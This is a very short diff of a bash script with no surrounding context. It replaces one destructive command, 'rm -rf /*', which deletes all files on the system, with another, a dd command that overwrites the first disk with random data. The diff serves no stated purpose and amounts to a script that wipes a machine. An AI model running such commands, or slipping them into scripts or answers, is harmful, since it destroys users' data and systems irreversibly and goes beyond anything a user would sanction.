@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rf /*
+dd if=/dev/random of=/dev/sda
